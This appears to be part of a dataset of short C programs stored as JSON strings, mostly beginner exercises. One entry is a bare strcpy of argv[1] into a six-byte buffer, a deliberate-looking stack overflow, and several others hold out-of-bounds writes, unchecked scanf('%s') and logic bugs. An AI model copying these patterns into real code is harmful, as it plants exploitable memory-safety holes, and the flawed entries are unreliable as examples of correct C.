    "#include <stdio.h>\nint main(void)\n{\n printf(\"Escolha uma op\u00e7\u00e3o do menu 1 - 4:\\n\");\n printf(\"1. adiciona um paciente\\n\");\n printf(\"2. Visualiza um paciente\\n\");\n printf(\"3. Procura uma paciente\\n\");\n printf(\"4. sa\u00edda\\n\");\n int input;\n scanf(\"%d\", &input);\n if(input == 1)\n{\n printf(\"Adicionando um paciente\\n\");\n}\n else if(input == 2)\n{\n printf(\"Visualizando um paciente\\n\");\n}\n else if(input == 3)\n{\n printf(\"Procurando um paciente\\n\");\n}\n else if(input == 4)\n{\n printf(\"Sa\u00edndo...\\n\");\n printf(\"Voc\u00ea deseja salvar? Y/N \");\n char saida;\n getchar();\n scanf(\"%c\", &saida);\n if(saida == 'Y' || saida == 'y')\n{\n printf(\"Salvando mudan\u00e7as!\\n\");\n}\n else if(saida == 'N' || saida == 'n')\n{\n printf(\"Mudan\u00e7as n\u00e3o salvas!\\n\");\n}\n else\n{\n printf(\"Resposta incorreta, digite novamente!\\n\");\n}\n}\n else\n{\n printf(\"Entrada incorreta!\\n\");\n}\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    int n,m,i=1,k=0,mod;\n    scanf(\"%d\",&n);\n    m=n+1;\n    while(m!=0)\n    {\n        while(m!=0)\n        {\n            mod=m%i;\n            if(mod==0)\n                k++;\n            i++;\n            if(i==m)\n                break;\n        }\n    if(k==1)\n        break;\n    i=1;\n    k=0;\n    m++;\n    }\n    printf(\"%d\",m);\n    return 0;\n}",
    "#include <stdio.h>\n\n\n\nvoid getWeek(char T[]);\nint main(){\n    char strs[255];\n    printf(\"\u8bf7\u8f93\u5165\u5355\u8bcd\uff1a\");\n    scanf(\"%s\",&strs);\n    getWeek(strs);\n}\nvoid getWeek(char T[]){\n    switch (T[0]){\n        case 'M':\n        case 'm':\n            printf(\"\u661f\u671f\u4e00\\n\");\n            break;\n        case 'T':\n        case 't':\n            if('u' == T[1] || 'U' == T[1]){ printf(\"\u661f\u671f\u4e8c\\n\");}\n            else if('h' == T[1] || 'H' == T[1]){printf(\"\u661f\u671f\u56db\\n\");}\n            else{printf(\"\u8f93\u5165\u9519\u8bef\u65e0\u6cd5\u5224\u65ad\u661f\u671f\u51e0\\n\");}\n            break;\n        case 'W':\n        case 'w':\n            printf(\"\u661f\u671f\u4e09\\n\");\n            break;\n        case 'F':\n        case 'f':\n            printf(\"\u661f\u671f\u4e94\\n\");\n            break;\n        case 'S':\n        case 's':\n            if('u' == T[1] || 'U' == T[1]){ printf(\"\u661f\u671f\u65e5\\n\");}\n            else if('a' == T[1] || 'A' == T[1]){printf(\"\u661f\u671f\u516d\\n\");}\n            else{printf(\"\u8f93\u5165\u9519\u8bef\u65e0\u6cd5\u5224\u65ad\u661f\u671f\u51e0\\n\");}\n            break;\n        default:\n            printf(\"\u8f93\u5165\u9519\u8bef\u65e0\u6cd5\u5224\u65ad\u661f\u671f\u51e0\\n\");\n            break;\n    }\n}",
    "#include <stdio.h>\nint main(void)\n{\n char *str1 = \"hello\";\n char str2[] = \"hello\";\n char *str3 = \"hello\";\n if(str1 == str2)\n  printf(\"1 OK\\n\");\n if(str1 == str3)\n  printf(\"2 OK\\n\");\n return 0;\n}",
    "#include <ctype.h>\n#include <stdio.h>\nint main() {\n    int arr[26] = {0};\n    printf(\"Enter first word: \");\n    char ch;\n    ch = getchar();\n    ch = toupper(ch);\n    while (ch != '\\n') {\n        if ((0 ? isalpha(ch) : (((unsigned)(ch)|32)-'a') < 26)) {\n            ++arr[ch - 65];\n        }\n        ch = getchar();\n        ch = toupper(ch);\n    }\n    printf(\"Enter second word: \");\n    ch = getchar();\n    ch = toupper(ch);\n    while (ch != '\\n') {\n        if ((0 ? isalpha(ch) : (((unsigned)(ch)|32)-'a') < 26)) {\n            --arr[ch - 65];\n        }\n        ch = getchar();\n        ch = toupper(ch);\n    }\n    int flag = 0;\n    for (size_t i = 0; i != 26; ++i) {\n        if (arr[i] != 0) {\n            flag = 1;\n            break;\n        }\n    }\n    if (flag == 0) {\n        printf(\"The words are anagrams.\\n\");\n    } else {\n        printf(\"The words are not anagrams.\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n\nint main() {\n    int sum = 0;\n    for(int i = 0; i < 1000; i++) {\n        if(i % 3 == 0 || i % 5 == 0) {\n            sum += i;\n        }\n    }\n    printf(\"%d\\n\", sum);\n}",
    "#include <stdio.h>\n\n\n\nvoid print_table(int, int);\nint main(int argc, char * argv[]) {\n    int i,j;\n    int comb;\n    comb = 1;\n    for(i=0; i<(3*3); i++) {\n        comb *= 2;\n    }\n    printf(\"All possible combinations are %d\\n\", comb);\n    for(i=0; i<comb; i++) {\n        print_table(i, 3);\n        printf(\"\\n\");\n    }\n    return 0;\n}\nvoid print_table(int n, int dim) {\n    int i=0, base;\n    char c;\n    for (i=0; i<(dim*dim); i++) {\n        if(i%dim == 0) {\n            printf(\"\\n\");\n        }\n        if(n%2)\n            c = 'X';\n        else\n            c = 'O';\n        printf(\"%c\", c);\n        n /= 2;\n    }\n}",
    "#include <stdio.h>\nint main()\n{\n float t, v;\n float l;\n scanf(\" %f\", &t);\n scanf(\" %f\", &v);\n l = (t*v)/12;\n printf(\"%.3f\\n\", l);\n return 0;\n}",
    "#include <stdio.h>\n#include <limits.h>\nint main()\n{\n    printf(\"char --> Max: %d  Min: %d\\n\", 127, (-127 -1));\n    printf(\"int --> Max: %d  Min: %d\\n\", 2147483647, (-2147483647 -1));\n    printf(\"long --> Max: %ld  Min: %ld\\n\", 2147483647L, (-2147483647L -1L));\n    printf(\"long long --> Max: %lld  Min: %lld\\n\", 9223372036854775807LL, (-9223372036854775807LL -1LL));\n    printf(\"short --> Max: %d  Min: %d\\n\", 32767, (-32767 -1));\n    printf(\"signed char --> Max: %d  Min: %d\\n\", 127, (-127 -1));\n    printf(\"uchar --> Max: %u  Min: %d\\n\", (127*2 +1), 0);\n    printf(\"uint --> Max: %ui  Min: %d\\n\", (2147483647 *2U +1U), 0);\n    printf(\"ull --> Max: %lu Min: %d\\n\", (9223372036854775807LL*2ULL+1ULL), 0);\n    printf(\"ul --> Max: %u  Min: %d\\n\", (2147483647L *2UL+1UL), 0);\n    printf(\"us --> Max: %u  Min: %d\\n\", (32767 *2 +1), 0);\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint main (int argc, char *argv[]){\n int i,id,idade[45],idsoma = 0 ,contadorid,contadoralt;\n float alt,altura[45],altsoma = 0,mediaid,mediaalt;\n for (i=0;i<=45;i++){\n  printf(\"Digite a idade do aluno\");\n  scanf(\"%d\",&id);\n  printf(\"Digite a Altura do aluno\");\n  scanf(\"%f\",&alt);\n  idade[i] = id;\n  altura[i] = alt;\n }\n for (i=0;i<=45;i++){\n  if(altura[i] < 1.70);\n  idsoma += idade[i];\n  contadoralt++;\n  if(idade[i] > 20);\n  altsoma += altura[45];\n  contadorid++;\n }\n mediaid = (idsoma/contadoralt);\n mediaalt = (altsoma/contadorid);\n printf(\"A media de altura dos alunos com menos de 1.70 e = %d \\n\",mediaid);\n printf(\"A media de idade dos alunos com mais de 20 anos = %d \\n\",mediaalt);\n}",
    "#include <stdio.h>\n#include <ctype.h>\nchar * test(char * st);\nint main(void)\n{\n char * (*fp)(char *) = test;\n char temp[10] = \"Enter\";\n printf(\"%s\\n\", temp);\n (*fp)(temp);\n printf(\"%s\\n\", temp);\n return 0;\n}\nchar * test(char * st)\n{\n while (*st)\n {\n  *st=toupper(*st);\n  st++;\n }\n return st;\n}",
    "#include <stdio.h>\nint gcd (int u, int v)\n{\n int temp;\n while (v != 0)\n {\n  temp = u % v;\n  u = v;\n  v = temp;\n }\n return u;\n}\nint main (void)\n{\n int result;\n result = gcd (150, 35);\n printf(\"The gcd of 150 and 35 is %i\\n\", result);\n result = gcd (1026, 405);\n printf(\"The gcd of 1026 and 405 is %i\\n\", result);\n result = gcd (83, 240);\n printf(\"The gcd of 83 and 240 is %i\\n\", result);\n return 0;\n}",
    "int main() {\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nvoid loadfile(char *path, char *buf, int siz)\n{\n FILE *fp = fopen(path, \"rb\");\n if (fp == ((void*)0)) {\n  fprintf((stderr), \"fdimge2iso: fopen error: %s\\n\", path);\n  exit(1);\n }\n fread(buf, 1, siz, fp);\n return;\n}\nint main(int argc, char **argv)\n{\n char *buf = malloc(0x1c0000);\n int i;\n FILE *fp;\n if (argc < 4) {\n  puts(\"usage>fdimg2iso iso-header fdimage iso-file\");\n  return 0;\n }\n for (i = 0; i < 0x1c0000; i++)\n  buf[i] = '\\0';\n loadfile(argv[1], &buf[0x8000], 0x5000);\n loadfile(argv[2], &buf[0xd000], 0x168000);\n fp = fopen(argv[3], \"wb\");\n if (fp == ((void*)0)) {\n  fprintf((stderr), \"fdimge2iso: fopen error: %s\\n\", argv[3]);\n  return 1;\n }\n fwrite(buf, 1, 0x1c0000, fp);\n return 0;\n}",
    "#include <unistd.h>\n#include <string.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\nint main()\n{\n    write(1, \"Hello World!\\n\", 13);\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n int arr[] = {1, 2, 3, 4, 5, 6};\n int *p = arr + 2;\n printf(\"*p = (%d)\\n\", *p);\n printf(\"*p = (%d)\\n\", p[-1]);\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n double num;\n scanf(\"%lf\" ,&num);\n if (num < 0 || num>100) {\n  printf(\"Fora do intervalo\\n\");\n }\n if (num <= 25 && num>=0) {\n  printf(\"Intervalo [0,25]\\n\");\n }\n if (num > 25 && num <= 50) {\n  printf(\"Intervalo (25,50]\");\n }\n if (num>50 && num<=75) {\n  printf(\"Intervalo (50,75]\");\n }\n if (num>70 && num<=100) {\n  printf(\"Intervalo (75,100]\");\n }\n return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    float f;\n    printf(\"Float number: \");\n    scanf(\"%f\", &f);\n    printf(\"The input is %.6f or %.6e.\\n\", f, f);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint filter() {\n  int input, limit = -1;\n  do {\n    scanf(\"%d\", &input);\n    if (input < limit) {\n      printf(\"Nagyobb szam kell, mint %d! \", limit);\n    }\n  } while (input < limit);\n  return input;\n}\nint main(int argc, char const *argv[]) {\n  int szam, again;\n  do {\n    printf(\"Hanyszor? \");\n    szam = filter();\n    for (int i = 1; i <= szam; i++) {\n      printf(\"%d. Sziasztok!\\n\", i);\n    }\n    printf(\"Ujra? [I]gen / [N]em: \");\n    while ((again = getchar()) == '\\n') {\n    };\n  } while (again == 'I' || again == 'i');\n  return 0;\n}",
    "#include<stdio.h>\nint main (){\n int num;\n scanf(\"%d\",&num);\n if(num==0){\n  printf(\"E\\n\");\n }else if (num>=1 && num<=35){\n  printf(\"D\\n\");\n }else if(num>=36 && num<=60){\n  printf(\"C\\n\");\n }else if(num>=61 && num<=85){\n  printf(\"B\\n\");\n } else if(num>=86 && num<=100){\n  printf(\"A\\n\");\n }\n return 0;\n}",
    "#include <stdio.h>\n\nvoid mult(int v[], int n, int x)\n{\n    for (int i = 0; i < n; i++)\n    {\n        v[i] *= x;\n    }\n}\nint main()\n{\n    int v[5], x;\n    for (int i = 0; i < 5; i++)\n    {\n        scanf(\"%d\", &v[i]);\n    }\n    scanf(\"%d\", &x);\n    mult(v, 5, x);\n    for (int i = 0; i < 5; i++)\n    {\n        printf(\"%d \", v[i]);\n    }\n    puts(\"\");\n    return 0;\n}",
    "#include <stdio.h>\n\n\nint main(int argc, const char *argv[])\n{\n float result = 0;\n int semidiameter = 0;\n printf(\"Please input a semidiameter of a circle:\\n\");\n scanf(\" %d\", &semidiameter);\n result = 3.1415926 * semidiameter * semidiameter;\n\n printf(\"\\tdebug info\\n\");\n\n printf(\"The result is : %f\\n\", result);\n return 0;\n}",
    "#include<stdio.h>\nint main ( void ) {\n    int n, fatorial = 1;\n    printf(\"Digite um numero: \");\n    scanf(\"%d\", &n);\n    if ( n == 1 || n == 0) fatorial = n;\n    for(int i = 1; i <= n; i++) {\n        fatorial *= i;\n    }\n    printf(\"%d\", fatorial);\n}",
    "#include <stdio.h>\nint main(){\n int lesmatop=0, velocidade=0, grupo=0;\n while(scanf(\"%d\", &grupo) != (-1) ){\n  while(grupo>0){\n   scanf(\"%d\", &velocidade);\n   if(lesmatop<velocidade){\n    lesmatop=velocidade;\n   }\n   grupo--;\n  }\n  if(lesmatop<10){\n   printf(\"1\\n\");\n  }\n  if(lesmatop>=10 && lesmatop<20){\n   printf(\"2\\n\");\n  }\n  if(lesmatop>=20){\n   printf(\"3\\n\");\n  }\n }\n return 0;\n}",
    "#include<stdio.h>\nvoid day_of_week(int a);\nint main()\n{\n int a;\n printf(\"Enter a number:\");\n scanf(\"%d\",&a);\n printf(\"\\n\");\n day_of_week(a);\n}\nvoid day_of_week(int a)\n{\n switch(a)\n {\n  case 0: printf(\"The day is Sunday.\");\n    break;\n  case 1: printf(\"The day is Monday.\");\n    break;\n  case 2: printf(\"The day is Tuesday.\");\n    break;\n  case 3: printf(\"The day is Wednesday.\");\n    break;\n  case 4: printf(\"The day is Thursday.\");\n    break;\n  case 5: printf(\"The day is Friday.\");\n    break;\n  case 6: printf(\"The day is Saturday.\");\n    break;\n  default: printf(\"Error!!! Please enter a number between 0 and 6 inclusive.\");\n  break;\n }\n}",
    "#include <stdio.h>\n#include <time.h>\nint main(void) {\n    printf(\"%p\\n\", ((void*)0));\n    printf(\"%ld\\n\", (long)((clock_t)1000000000));\n}",
    "#include<stdio.h>\n#include<math.h>\nint main()\n{\n int i,j,s=0,num;\n scanf(\"%d\",&i);\n num=i;\n while(i!=0)\n {\n  j=i%10;\n  i=i/10;\n  s=s * 10 + j;\n }\n if(num==s)\n  printf(\"\\n--------------------Palindrom---------------------\");\n else\n  printf(\"\\nNot Palindrome\");\n printf(\"\\n%d\",s);\n return 0;\n}",
    "#include<stdio.h>\n#include<math.h>\nint main()\n{\n    float x,t0,t1,R,sum,acc=0.0001;\n    printf(\"Enter the value of x: \");\n    scanf(\"%f\",&x);\n    t0=1;\n    sum=t0;\n    printf(\"n\\ttn\\tSn\\tfabs(tn/sum)\\n\");\n    int i=0;\n    do{\n        printf(\"%d\\t%.2f\\t%.2f\\t%f\\n\",i,t1,sum,fabs(t1/sum));\n        i++;\n        R=-(x*x)/((2*i-1)*(2*i));\n        t1=R*t0;\n        sum=sum+t1;\n        t0=t1;\n    } while(fabs(t1/sum)>acc);\n    printf(\"\\nThe sum of cos(%.2f) is: %f summing %d terms.\",x,sum,i);\n}",
    "#include <stdio.h>\n\n\n\n\nvoid ESP32_TCP_init(void);\nvoid ESP32_MQTT_init(void);\nvoid ESP32_UDP_init(void);\nvoid ESP32_HTTP_init(void);\nint main(void)\n{\n\n\n\n\n        ESP32_MQTT_init();\n\n\n\n\n\n\n\n}\n\n    void ESP32_MQTT_init(void)\n    {\n    printf (\"Exectiting MQTT AT commands...\\r\\n\");\n    }",
    "#include <stdio.h>\nvoid sum_1_to_n(void);\nint is_break = 0;\nint main()\n{\n    int n, sum;\n    while (1)\n    {\n        if (is_break)\n            break;\n        sum_1_to_n();\n    }\n}\nvoid sum_1_to_n(void)\n{\n    int n, sum;\n    printf(\"n\uc744 \uc785\ub825\ud558\uc2dc\uc624.\\n\");\n    scanf(\"%d\", &n);\n    if (n == 0)\n        is_break = 1;\n    sum = 0;\n    for (int i = 0; i <= n; i++)\n    {\n        sum += i;\n    }\n    printf(\"%d\\n\", sum);\n    return;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\nint main()\n{\n    float jardas, metros;\n    printf(\"----CONVERSAO DE METROS PARA JARDAS----\\n\");\n    printf(\"Insira o valor de comprimento em metros: \");\n    scanf(\"%f\", &metros);\n    jardas = metros/0.91;\n    printf(\"\\nO valor do comprimento em metros convertidos para jardas eh de: %.2f\", jardas);\n    return 0;\n}",
    "#include <stdio.h>\nchar *removeAllSpaces(char *data) {\n    char *in, *out;\n    for (in = out = data; *in !='\\0'; in++)\n        if (*in != ' ') *out++ = *in;\n    *out = '\\0';\n    return data;\n}\nint main(int argc, char *argv[]) {\n    for (int ii = 1; ii < argc; ii++)\n        printf(\"%s\\n\", removeAllSpaces(argv[ii]));\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    char ch;\n    printf(\"Enter the first latter of your name :\");\n    ch = getchar();\n    printf(\"Enter the first latter of your name :%c\\n\", ch);\n    return 0;\n}",
    "#include<stdio.h>\n#include<math.h>\nint main(){\n    double a, b, c, dis;\n    printf(\"Enter values of a, b and c of a quadratic equation: \");\n    scanf(\"%lf %lf %lf\", &a, &b, &c);\n    dis = (b*b) - (4*a*c);\n    switch(dis > 0){\n        case 1:\n            printf(\"the roots are real and distinct = %.2lf and %.2lf\\n\", ((-b + sqrt(dis))/(2*a)), (-b - sqrt(dis))/(2*a));\n            break;\n        case 0:\n            switch (dis < 0){\n                case 1:\n                    printf(\"The roots are imaginary = %.2lf + i%.2lf and %.2lf - i%.2lf\\n\", -b/(2*a), sqrt(-dis)/(2*a), -b/(2*a), sqrt(-dis)/(2*a));\n                    break;\n                case 0:\n                    printf(\"The roots are real and equal = %.2lf and %.2lf\\n\", -b/(2*a), -b/(2*a));\n                    break;\n            }\n    }\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n#include<locale.h>\n\nint main(void)\n{\n    int listOfNumbers[1000];\n    int position=0;\n    int fileSize = 0;\n    int num;\n    FILE *file;\n    setlocale(6,\"\");\n    if((file = fopen(\"listOfNumbers.txt\",\"r\")) == ((void*)0)){\n                printf(\"\\nVoc\u00ea pode inserir at\u00e9 %d valores inteiros\",1000);\n            while(position < 1000){\n                printf(\"\\n-----------------------------------------------\");\n                printf(\"\\n %d valores restantes de %d\",(1000 - position),1000);\n                printf(\"\\n-----------------------------------------------\");\n                printf(\"\\nDigite um numero inteiro maior que 0, ou negativo para sair: \");\n                scanf(\"%d\",&listOfNumbers[position]);\n                if((listOfNumbers[position] < 1))\n                    break;\n                position++;\n            };\n            file = fopen(\"listOfNumbers.txt\",\"w\");\n            for(int i=0;i<position;i++){\n                fprintf(file,\"%d\\n\",listOfNumbers[i]);\n            }\n        fclose(file);\n    } else {\n            while (fscanf(file,\"%d\",&num) == 1){\n                printf(\"%d\\n\",num);\n                fileSize++;\n            }\n            if(fileSize < 1){\n                        printf(\"\\nVoc\u00ea pode inserir at\u00e9 %d valores inteiros\",1000);\n                    while(position < 1000){\n                        printf(\"\\n-----------------------------------------------\");\n                        printf(\"\\n %d valores restantes de %d\",(1000 - position),1000);\n                        printf(\"\\n-----------------------------------------------\");\n                        printf(\"\\nDigite um numero inteiro maior que 0, ou negativo para sair e gravar os dados: \");\n                        scanf(\"%d\",&listOfNumbers[position]);\n                        if((listOfNumbers[position] < 1))\n                            break;\n                        position++;\n                    };\n                    file = fopen(\"listOfNumbers.txt\",\"w\");\n                    for(int i=0;i<position;i++){\n                        fprintf(file,\"%d\\n\",listOfNumbers[i]);\n                    }\n            }\n        fclose(file);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    char a1[8];\n    char a2[8];\n    scanf(\"%s\", a1);\n    scanf(\"%s\", a2);\n    printf(\"%s##%s##\\n\", a1, a2);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\n\nint main(int argc, char const *argv[])\n{\n int a, b;\n float salary = 56;\n char letter = 'Z';\n a = 8;\n b = 34;\n int c = a + b;\n printf(\"%d\\n\", c);\n printf(\"%f\\n\", salary);\n printf(\"%c\\n\", letter);\n const double PI = 3.14;\n printf(\"%f\\n\", PI);\n printf(\"%.3f\\n\", PI);\n printf(\"%d\\n\", 4);\n return 0;\n}",
    "#include <stdio.h>\n\nint main(int argc, const char* argv[]){\n    short dates [4];\n    short * pti;\n    short index;\n    double bills[4];\n    double * ptf;\n    pti = dates;\n    ptf = bills;\n    printf(\"%23s %10s\\n\",\"short\", \"double\");\n    for (index = 0; index < 4; index++) {\n        printf(\"points + %d: %10p %10p\\n\",index,pti + index, ptf + index);\n    }\n    return 0;\n}",
    "#include <string.h>\nint main(int argc, char **argv)\n{\n char a[] = \"hello\";\n strcpy(a, argv[1]);\n return 0;\n}",
    "#include <stdio.h>\nint main(){\n int i = 0;\n printf(\"%12s %12s\\n\", \"ASCII VALUE\", \"CHARACTER\");\n while(i<=255){\n  printf(\"%12d %12c\\n\", i, i);\n  i++;\n }\n return 0;\n}",
    "#include<stdio.h>\nvoid guessCnB( int secret[], int guess[]){\n int cows = 0, bulls = 0;\n for( int i = 0; i< 4; i++)\n  if( guess[i] == secret[i])\n   bulls++;\n for( int i = 0; i< 4; i++){\n  for( int j=0; j< 4; j++){\n   if( secret[i] == guess[j] && i!=j )\n    cows++;\n  }\n }\n printf(\"\\nCows -> %d\\nBulls -> %d\\n\", cows, bulls);\n}\nint main(){\n int secret[] = { 9, 2, 6, 8};\n int guess1[] = { 2, 4, 7, 8};\n int guess2[] = { 8, 6, 2, 9};\n int guess3[] = { 9, 2, 5, 7};\n guessCnB( secret, guess1);\n guessCnB( secret, guess2);\n guessCnB( secret, guess3);\n}",
    "#include <stdio.h>\n#include <time.h>\n#include <stdlib.h>\nint main( void ) {\n  srand( ( unsigned int ) time( ((void*)0) ) );\n  int coin = rand() % 2;\n  if( coin ) puts( \"tails\" );\n  else puts( \"heads\" );\n  return 0;\n}",
    "#include <stdio.h>\nint rDigitValue1(int num, int k);\nint main()\n{\n    int k, number;\n    printf(\"Enter a number: \\n\");\n    scanf(\"%d\", &number);\n    printf(\"Enter k position: \\n\");\n    scanf(\"%d\", &k);\n    printf(\"rDigitValue1(): %d\\n\", rDigitValue1(number, k));\n    return 0;\n}\nint rDigitValue1(int num, int k)\n{\n   if (k==0)\n      return 0;\n   else if (k==1)\n      return num%10;\n   else\n      return rDigitValue1(num/10, k-1);\n}",
    "#include<stdio.h>\nint main(void)\n{\n    int i, j, n, k, x[1000], t;\n    while(scanf(\"%d\\n\" , &n) != (-1))\n    {\n        k = 0;\n        for(i = 0; i < n; i ++)\n          scanf(\"%d \" , &x[i]);\n        for(i = 0; i < n - 1; i ++)\n        {\n            for(j = i + 1; j < n; j ++)\n            {\n                if(x[j] < x[i])\n                  k ++;\n            }\n        }\n        printf(\"Minimum exchange operations : %d\\n\" , k);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n float n1, n2, n3, n4, media, exame, media_final;\n scanf(\"%f %f %f %f\", &n1, &n2, &n3, &n4);\n media = (n1 * 2 + n2 * 3 + n3 * 4 + n4 * 1) / 10;\n if (media >= 7.0)\n {\n  printf(\"Media: %.1f\\n\", media);\n  printf(\"Aluno aprovado.\\n\");\n }\n else if (media < 5.0)\n {\n  printf(\"Media: %.1f\\n\", media);\n  printf(\"Aluno reprovado.\\n\");\n }\n else\n {\n  scanf(\"%f\", &exame);\n  media_final = (media + exame) / 2;\n  if (media_final >= 5)\n  {\n   printf(\"Media: %.1f\\n\", media);\n   printf(\"Aluno em exame.\\n\");\n   printf(\"Nota do exame: %.1f\\n\", exame);\n   printf(\"Aluno aprovado.\\n\");\n   printf(\"Media final: %.1f\\n\", media_final);\n  }\n  else\n  {\n   printf(\"Media: %.1f\\n\", media);\n   printf(\"Aluno em exame.\\n\");\n   printf(\"Nota do exame: %.1f\\n\", exame);\n   printf(\"Aluno reprovado.\\n\");\n   printf(\"Media final: %.1f\\n\", media_final);\n  }\n }\n return 0;\n}",
    "#include<stdio.h>\n\n\nint f(void);\nvoid pr(int x[5][6]);\nvoid compare(int rows, int x[5][6],int *ns,int *nl);\nint main()\n{\n    int a[5][6];\n    int i,j;\n    int ns,nl;\n    int rows;\n    printf(\"lab 4 Problem 1 solution by <Tu Jingyu>\\n\");\n    for (i=0;i<=4;i++)\n    {\n        for(j=0;j<=5;j++)\n        {\n            a[i][j]=f();\n        }\n    }\n    printf(\"Array\\n\");\n    pr(a);\n    printf(\"enter index of row to compare with\\n\");\n    scanf(\"%d\",&rows);\n    compare(rows,a,&ns,&nl);\n    printf(\"nS=%3d, nL=%3d \\n\",ns,nl);\n    return 0;\n}\nint f(void)\n{\n    static int val=19331;\n    val=-val*353 % 41;\n    return val;\n}\nvoid pr(int x[5][6])\n{\n    int i,j;\n    for (i=0;i<=4;i++)\n    {\n        for(j=0;j<=5;j++)\n        {\n            printf(\"        %d      \",x[i][j]);\n        }\n        printf(\"\\n\");\n    }\n}\nvoid compare(int r, int x[5][6],int *ns,int *nl)\n{\n    int i,j;\n    int sum,isum;\n    int small=0,large=0;\n    sum=0;\n    for(j=0;j<=5;j++)\n    {\n        sum+= x[r][j];\n    }\n     printf(\"Sum for row index = %d is %d\\n\",r,sum);\n    for(i=0;i<5;i++)\n    {\n        isum = 0;\n        if(i!=r)\n        {\n            for(j=0;j<=5;j++)\n            {\n                isum+= x[i][j];\n            }\n            if(isum>sum)\n            {\n                large++;\n            }\n            else\n            {\n                small++;\n            }\n        }\n        else\n        {\n        }\n    }\n    *ns = small;\n    *nl = large;\n}",
    "#include <stdio.h>\nint main(void){\n long long n,cnt=0;\n scanf(\"%lld\",&n);\n while(n!=1){\n  if(n&1) n=n*3+1;\n  else n/=2;\n  ++cnt;\n }\n printf(\"%lld\\n\",cnt+1);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\n\n\nchar m[8][8];\nint dx[8] = {-1,-1,-1,0,0,1,1,1};\nint dy[8] = {-1,0,1,-1,1,-1,0,1};\nvoid inicia(){\n  int i,j;\n  for(i=0; i < 8; i++)\n    for(j=0; j < 8; j++) m[i][j] = ' ';\n  for(i=0; i < 8; i++){\n    m[i][0] = '#';\n    m[i][7] = '#';\n    m[7][i] = '#';\n    m[0][i] = '#';\n  }\n  for(i=0; i < 8 -2; i++){\n    m[2][i] = '#';\n    m[4][i+2] = '#';\n  }\n  m[8 -3][2] = '#';\n  m[8 -3][4] = '#';\n}\nvoid imprime(){\n  int i,j;\n  for(i=0; i < 8; i++){\n    for(j=0; j < 8; j++) printf(\"%c\",m[i][j]);\n    printf(\"\\n\");\n  }\n  printf(\"\\n\");\n}\nvoid tenta(int i, int j, char c){\n  int k;\n  if(m[i][j] == ' '){\n    m[i][j] = c;\n    if((i==6) &&(j==6)) {\n        m[i][j] = '+';\n        imprime();\n    } else {\n      for(k=0; k < 8; k++) tenta(i+dx[k],j+dy[k],'.');\n    }\n    m[i][j] = ' ';\n  }\n}\nint main(int argc, char *argv[])\n{\n  inicia();\n  tenta(1,1,'*');\n  system(\"PAUSE\");\n  return 0;\n}",
    "#include <stdio.h>\n#include <ctype.h>\n#include <string.h>\n\nvoid usun_odstepy(char tab[]);\nint main(void)\n{\n char tab[20];\n puts(\"Podaj lancuch: \");\n while (fgets(tab, 20, (stdin)) != ((void*)0) && *tab != '\\n')\n {\n  usun_odstepy(tab);\n  printf(\"Lancuch po usunieciu spacji: %s\\n\", tab);\n  puts(\"Podaj lancuch: \");\n }\n return 0;\n}\nvoid usun_odstepy(char tab[])\n{\n int dlugosc = strlen(tab);\n int licznik = 0;\n for (int i = 0; i < dlugosc; i++)\n  if (!__isspace(tab[i]))\n   licznik++;\n char pom[licznik];\n for (int i = 0, j = 0; i < dlugosc; i++)\n  if (!__isspace(tab[i]))\n  {\n   if (j == licznik)\n    break;\n   pom[j] = tab[i];\n   j++;\n  }\n for (int i = 0; i < licznik; i++)\n  tab[i] = pom[i];\n tab[licznik] = '\\0';\n}",
    "#include <stdio.h>\n#include <semaphore.h>\n#include <pthread.h>\n#include <unistd.h>\n\n\n\n\n\n\nsem_t mutex;\nsem_t S[5];\nvoid *philospher(void *num);\nvoid take_fork(int);\nvoid put_fork(int);\nvoid test(int);\nint state[5];\nint phil_num[5] = {0, 1, 2, 3, 4};\nint main()\n{\n    int i;\n    pthread_t thread_id[5];\n    sem_init(&mutex, 0, 1);\n    for (i = 0; i < 5; i++)\n        sem_init(&S[i], 0, 0);\n    for (i = 0; i < 5; i++)\n    {\n        pthread_create(&thread_id[i], ((void*)0), philospher, &phil_num[i]);\n        printf(\"Philosopher %d is thinking\\n\", i + 1);\n    }\n    for (i = 0; i < 5; i++)\n        pthread_join(thread_id[i], ((void*)0));\n}\nvoid *philospher(void *num)\n{\n    while (1)\n    {\n        int *i = num;\n        sleep(1);\n        take_fork(*i);\n        sleep(0);\n        put_fork(*i);\n    }\n}\nvoid take_fork(int ph_num)\n{\n    sem_wait(&mutex);\n    state[ph_num] = 1;\n    printf(\"Philosopher %d is Hungry\\n\", ph_num + 1);\n    test(ph_num);\n    sem_post(&mutex);\n    sem_wait(&S[ph_num]);\n    sleep(1);\n}\nvoid test(int ph_num)\n{\n    if (state[ph_num] == 1 && state[(ph_num + 4) % 5] != 2 && state[(ph_num + 1) % 5] != 2)\n    {\n        state[ph_num] = 2;\n        sleep(2);\n        printf(\"Philosopher %d takes fork %d and %d\\n\", ph_num + 1, (ph_num + 4) % 5 + 1, ph_num + 1);\n        printf(\"Philosopher %d is Eating\\n\", ph_num + 1);\n        sem_post(&S[ph_num]);\n    }\n}\nvoid put_fork(int ph_num)\n{\n    sem_wait(&mutex);\n    state[ph_num] = 0;\n    printf(\"Philosopher %d putting fork %d and %d down\\n\", ph_num + 1, (ph_num + 4) % 5 + 1, ph_num + 1);\n    printf(\"Philosopher %d is thinking\\n\", ph_num + 1);\n    test((ph_num + 4) % 5);\n    test((ph_num + 1) % 5);\n    sem_post(&mutex);\n}",
